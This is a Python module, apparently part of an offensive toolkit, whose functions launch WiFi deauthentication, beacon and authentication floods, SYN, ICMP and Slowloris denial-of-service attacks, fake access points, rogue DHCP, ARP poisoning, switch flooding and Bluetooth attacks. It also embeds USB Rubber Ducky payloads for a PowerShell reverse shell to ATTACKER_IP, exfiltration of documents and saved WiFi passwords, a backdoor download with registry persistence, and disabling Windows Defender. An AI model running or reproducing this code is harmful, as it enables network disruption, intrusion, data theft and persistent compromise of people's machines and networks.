#!/usr/bin/env python3
"""
Physical Attack Module
WiFi beacon spam, network DoS, USB attacks, physical pentesting tools
"""

import os
import subprocess
import time
from pathlib import Path
from datetime import datetime

class PhysicalAttacks:
    def __init__(self, work_dir, log_callback=None):
        self.work_dir = Path(work_dir)
        self.log = log_callback or print
        self.attacks_dir = self.work_dir / "physical_attacks"
        self.attacks_dir.mkdir(exist_ok=True)

    def wifi_beacon_spam(self, interface, num_ssids=100, target_area="Office"):
        """Spam WiFi beacons to overwhelm scanners"""
        self.log(f"Starting WiFi beacon spam with {num_ssids} SSIDs...", "INFO")

        # Generate SSID list
        ssid_file = self.attacks_dir / f"ssids_{int(time.time())}.txt"

        with open(ssid_file, 'w') as f:
            for i in range(num_ssids):
                f.write(f"{target_area}_Network_{i:04d}\n")
                f.write(f"FREE_WIFI_{i:04d}\n")
                f.write(f"Guest_Access_{i:04d}\n")

        self.log(f"Generated {num_ssids * 3} fake SSIDs", "SUCCESS")

        # Use mdk4 for beacon flooding
        self.log("Starting beacon flood attack...", "INFO")
        self.log("This will create massive WiFi pollution!", "WARNING")

        os.system(f"mdk4 {interface} b -f {ssid_file} -s 1000")

    def wifi_deauth_storm(self, interface, mode='all'):
        """Mass deauthentication attack"""
        self.log("Starting deauthentication storm...", "WARNING")

        if mode == 'all':
            # Deauth everything in range
            self.log("Deauthing ALL networks in range!", "WARNING")
            os.system(f"mdk4 {interface} d -c 1,2,3,4,5,6,7,8,9,10,11")
        else:
            # Targeted deauth
            bssid = input("Enter target BSSID: ")
            os.system(f"aireplay-ng --deauth 0 -a {bssid} {interface}")

    def wifi_authentication_dos(self, interface):
        """Authentication DoS attack"""
        self.log("Starting authentication DoS...", "INFO")

        # Use mdk4 authentication flood
        os.system(f"mdk4 {interface} a -a")

    def wifi_michael_shutdown(self, interface):
        """Michael countermeasures exploitation"""
        self.log("Starting Michael shutdown attack...", "INFO")
        self.log("This exploits TKIP countermeasures", "INFO")

        os.system(f"mdk4 {interface} m")

    def wifi_eapol_flood(self, interface):
        """EAPOL packet flooding"""
        self.log("Starting EAPOL flood...", "INFO")

        os.system(f"mdk4 {interface} e")

    def network_crash_attack(self, interface, target_ip=None):
        """Network crash/DoS attack"""
        self.log("Network crash attack - USE WITH CAUTION!", "WARNING")

        if target_ip:
            # Targeted attack
            self.log(f"Targeting {target_ip}", "INFO")

            # SYN flood
            self.log("SYN flood attack", "INFO")
            os.system(f"hping3 -S -p 80 --flood {target_ip}")

        else:
            # Broadcast storm
            self.log("Broadcast storm attack", "WARNING")
            os.system(f"mdk4 {interface} d")

    def evil_twin_karma(self, interface, capture_creds=True):
        """KARMA attack - fake AP responding to all probes"""
        self.log("Starting KARMA attack...", "INFO")

        # Create hostapd config for KARMA
        karma_conf = self.attacks_dir / f"karma_{int(time.time())}.conf"

        with open(karma_conf, 'w') as f:
            f.write(f"interface={interface}\n")
            f.write(f"driver=nl80211\n")
            f.write(f"ssid=FreeWiFi\n")
            f.write(f"channel=6\n")
            f.write(f"hw_mode=g\n")
            f.write(f"# KARMA mode - respond to all probes\n")
            f.write(f"enable_karma=1\n")

        # Start KARMA AP
        os.system(f"hostapd {karma_conf}")

    def usb_rubber_ducky_payload(self, payload_type='reverse_shell'):
        """Generate USB Rubber Ducky payloads"""
        self.log(f"Generating USB Rubber Ducky payload: {payload_type}", "INFO")

        payload_file = self.attacks_dir / f"ducky_{payload_type}_{int(time.time())}.txt"

        payloads = {
            'reverse_shell': """
REM Rubber Ducky Reverse Shell Payload
DELAY 1000
GUI r
DELAY 500
STRING powershell -windowstyle hidden
ENTER
DELAY 1000
STRING $client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
ENTER
""",
            'exfiltrate': """
REM Data Exfiltration Payload
DELAY 1000
GUI r
DELAY 500
STRING powershell -windowstyle hidden
ENTER
DELAY 1000
STRING Get-ChildItem -Path C:\\ -Include *.txt,*.doc,*.docx,*.pdf -Recurse | Compress-Archive -DestinationPath $env:TEMP\\data.zip; Invoke-WebRequest -Uri http://ATTACKER_IP:8000/upload -Method POST -InFile $env:TEMP\\data.zip
ENTER
""",
            'backdoor': """
REM Persistent Backdoor
DELAY 1000
GUI r
DELAY 500
STRING powershell -windowstyle hidden
ENTER
DELAY 1000
STRING $url='http://ATTACKER_IP/backdoor.exe';$path=$env:TEMP+'\\svchost.exe';(New-Object System.Net.WebClient).DownloadFile($url,$path);New-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'SecurityUpdate' -Value $path;Start-Process $path
ENTER
""",
            'wifi_passwords': """
REM WiFi Password Exfiltration
DELAY 1000
GUI r
DELAY 500
STRING cmd /c for /f "tokens=2 delims=:" %i in ('netsh wlan show profiles ^| findstr ":"') do @netsh wlan show profile %i key=clear | findstr "Key Content" > %TEMP%\\wifi.txt && powershell Invoke-WebRequest -Uri http://ATTACKER_IP:8000/wifi -Method POST -InFile %TEMP%\\wifi.txt
ENTER
""",
            'disable_defender': """
REM Disable Windows Defender
DELAY 1000
GUI r
DELAY 500
STRING powershell -windowstyle hidden
ENTER
DELAY 1000
STRING Set-MpPreference -DisableRealtimeMonitoring $true; Set-MpPreference -DisableIOAVProtection $true; Set-MpPreference -DisableBehaviorMonitoring $true
ENTER
"""
        }

        if payload_type in payloads:
            with open(payload_file, 'w') as f:
                f.write(payloads[payload_type])

            self.log(f"Payload saved to: {payload_file}", "SUCCESS")
            self.log("Replace ATTACKER_IP with your IP address", "INFO")
            return payload_file
        else:
            self.log(f"Unknown payload type: {payload_type}", "ERROR")
            return None

    def badusb_payload_generator(self, target_os='windows'):
        """Generate BadUSB payloads for various attacks"""
        self.log(f"Generating BadUSB payload for {target_os}", "INFO")

        if target_os == 'windows':
            payloads = [
                "reverse_shell",
                "exfiltrate",
                "backdoor",
                "wifi_passwords",
                "disable_defender",
                "ransomware_sim",
                "browser_passwords"
            ]
        else:
            payloads = [
                "linux_reverse_shell",
                "linux_backdoor",
                "ssh_key_inject"
            ]

        self.log(f"Available payloads for {target_os}:", "INFO")
        for idx, p in enumerate(payloads, 1):
            print(f"  [{idx}] {p}")

    def proximity_attack(self, interface):
        """Automated attack on proximity WiFi devices"""
        self.log("Proximity-based attack automation", "INFO")

        # Scan for nearby devices
        self.log("Scanning for nearby devices...", "INFO")
        os.system(f"airodump-ng {interface} --output-format csv -w {self.attacks_dir}/proximity_scan --write-interval 10")

        # Parse results and auto-attack
        self.log("Attacking discovered devices...", "INFO")

        # This would parse the CSV and launch targeted attacks

    def rogue_dhcp_server(self, interface):
        """Rogue DHCP server to intercept network traffic"""
        self.log("Starting rogue DHCP server...", "WARNING")

        dhcp_conf = self.attacks_dir / f"dhcp_{int(time.time())}.conf"

        with open(dhcp_conf, 'w') as f:
            f.write("""
interface=eth0
dhcp-range=192.168.1.100,192.168.1.200,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
""")

        os.system(f"dnsmasq -C {dhcp_conf} -d")

    def bluetooth_attack_suite(self):
        """Bluetooth attack automation"""
        self.log("Bluetooth attack suite", "INFO")

        print("\nBluetooth Attacks:")
        print("[1] Bluetooth discovery")
        print("[2] Bluesmack (DoS)")
        print("[3] BlueSnarf (file theft)")
        print("[4] BlueBug (phone control)")
        print("[5] OBEX push spam")

        choice = input("\nSelect attack: ")

        if choice == "1":
            os.system("hcitool scan")
        elif choice == "2":
            target = input("Enter target MAC: ")
            os.system(f"l2ping -i hci0 -s 600 -f {target}")
        elif choice == "3":
            target = input("Enter target MAC: ")
            self.log("BlueSnarf attack", "INFO")
            # Would use specialized tools like blooover
        elif choice == "4":
            self.log("BlueBug attack requires specialized hardware", "INFO")
        elif choice == "5":
            target = input("Enter target MAC: ")
            spam_file = "/tmp/spam.txt"
            for i in range(100):
                os.system(f"obexftp -b {target} -p {spam_file}")

    def nfc_attack_simulation(self):
        """NFC/RFID attack simulation"""
        self.log("NFC/RFID attack tools", "INFO")

        print("\nNFC Attacks:")
        print("[1] Read NFC tag")
        print("[2] Clone NFC tag")
        print("[3] Relay attack simulation")

        # This would integrate with tools like libnfc, proxmark3

    def physical_port_scan(self, interface):
        """Physical network port scanning"""
        self.log("Physical network scanning initiated", "INFO")

        # Scan for active ports on physical network
        os.system(f"netdiscover -i {interface} -r 192.168.0.0/16")

    def vlan_hopping_attack(self, interface):
        """VLAN hopping attack"""
        self.log("VLAN hopping attack", "INFO")

        # DTP attack
        self.log("Attempting DTP negotiation...", "INFO")
        os.system(f"yersinia -G")  # Graphical Yersinia for DTP attacks

    def cdp_flood(self, interface):
        """CDP flooding attack"""
        self.log("CDP flood attack", "INFO")
        os.system(f"yersinia -I -M cdp -A")

    def spanning_tree_attack(self, interface):
        """Spanning Tree Protocol attack"""
        self.log("STP attack - this can crash switches!", "WARNING")
        os.system(f"yersinia -I -M stp -A")

    def arp_cache_poisoning_dos(self, interface, target_ip, gateway_ip):
        """ARP cache poisoning DoS"""
        self.log("ARP poisoning DoS attack", "WARNING")

        # Send conflicting ARP replies
        os.system(f"arpspoof -i {interface} -t {target_ip} {gateway_ip}")

    def mac_flooding(self, interface):
        """MAC address table flooding"""
        self.log("MAC flooding attack - can crash switches!", "WARNING")

        os.system(f"macof -i {interface} -n 1000000")

    def icmp_flood(self, target):
        """ICMP flood attack"""
        self.log(f"ICMP flood attack on {target}", "WARNING")

        os.system(f"hping3 --icmp --flood {target}")

    def slowloris_attack(self, target, port=80):
        """Slowloris DoS attack"""
        self.log("Slowloris attack - keeps connections open", "INFO")

        slowloris_script = self.attacks_dir / "slowloris.py"

        # Generate slowloris script
        with open(slowloris_script, 'w') as f:
            f.write("""#!/usr/bin/env python3
import socket
import time
import random

target = 'TARGET_IP'
port = PORT
sockets = []

def create_socket():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target, port))
    s.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\\r\\n".encode())
    s.send(f"User-Agent: Mozilla/5.0\\r\\n".encode())
    s.send(f"Accept-language: en-US,en\\r\\n".encode())
    s.send(f"Connection: keep-alive\\r\\n".encode())
    return s

print(f'[*] Starting Slowloris attack on {target}:{port}')

for _ in range(200):
    try:
        sockets.append(create_socket())
    except:
        pass

print(f'[*] Created {len(sockets)} connections')

while True:
    for s in sockets:
        try:
            s.send(f"X-a: {random.randint(1, 5000)}\\r\\n".encode())
        except:
            sockets.remove(s)
            try:
                sockets.append(create_socket())
            except:
                pass
    time.sleep(15)
""")

        # Replace placeholders
        with open(slowloris_script, 'r') as f:
            content = f.read()

        content = content.replace('TARGET_IP', target).replace('PORT', str(port))

        with open(slowloris_script, 'w') as f:
            f.write(content)

        os.chmod(slowloris_script, 0o755)

        self.log(f"Slowloris script: {slowloris_script}", "SUCCESS")
        os.system(f"python3 {slowloris_script}")

    def wifi_jamming_attack(self, interface, channel=None):
        """WiFi jamming using various techniques"""
        self.log("WiFi jamming attack", "WARNING")

        if channel:
            self.log(f"Jamming channel {channel}", "INFO")
            os.system(f"mdk4 {interface} d -c {channel}")
        else:
            self.log("Jamming all channels", "INFO")
            os.system(f"mdk4 {interface} d")

    def fake_ap_honeypot(self, interface, ssid="Free WiFi"):
        """Create fake AP honeypot to capture credentials"""
        self.log(f"Creating honeypot AP: {ssid}", "INFO")

        # Create hostapd config
        hostapd_conf = self.attacks_dir / f"honeypot_{int(time.time())}.conf"

        with open(hostapd_conf, 'w') as f:
            f.write(f"interface={interface}\n")
            f.write(f"driver=nl80211\n")
            f.write(f"ssid={ssid}\n")
            f.write(f"channel=6\n")
            f.write(f"hw_mode=g\n")

        # Create dnsmasq config for captive portal
        dnsmasq_conf = self.attacks_dir / f"dns_honeypot_{int(time.time())}.conf"

        with open(dnsmasq_conf, 'w') as f:
            f.write(f"interface={interface}\n")
            f.write(f"dhcp-range=10.0.0.10,10.0.0.100,12h\n")
            f.write(f"dhcp-option=3,10.0.0.1\n")
            f.write(f"dhcp-option=6,10.0.0.1\n")
            f.write(f"address=/#/10.0.0.1\n")

        self.log("Starting honeypot AP...", "INFO")
        self.log("Set up a web server on port 80 for captive portal", "INFO")

        # Start services
        os.system(f"hostapd {hostapd_conf} &")
        time.sleep(2)
        os.system(f"dnsmasq -C {dnsmasq_conf} &")

    def wps_pixie_dust_attack(self, interface, bssid):
        """WPS Pixie Dust attack (offline WPS PIN crack)"""
        self.log("WPS Pixie Dust attack", "INFO")

        os.system(f"reaver -i {interface} -b {bssid} -vv -K")

    def full_physical_assessment(self, interface):
        """Complete physical penetration test"""
        self.log("Starting full physical assessment...", "INFO")

        # Phase 1: Reconnaissance
        self.log("Phase 1: Network Discovery", "INFO")
        os.system(f"netdiscover -i {interface} -r 192.168.0.0/16")

        # Phase 2: WiFi Assessment
        self.log("Phase 2: WiFi Assessment", "INFO")
        os.system(f"airodump-ng {interface}")

        # Phase 3: Attack
        self.log("Phase 3: Attack Phase", "INFO")
        self.wifi_beacon_spam(interface, 50, "Physical_Test")

        self.log("Physical assessment complete", "SUCCESS")
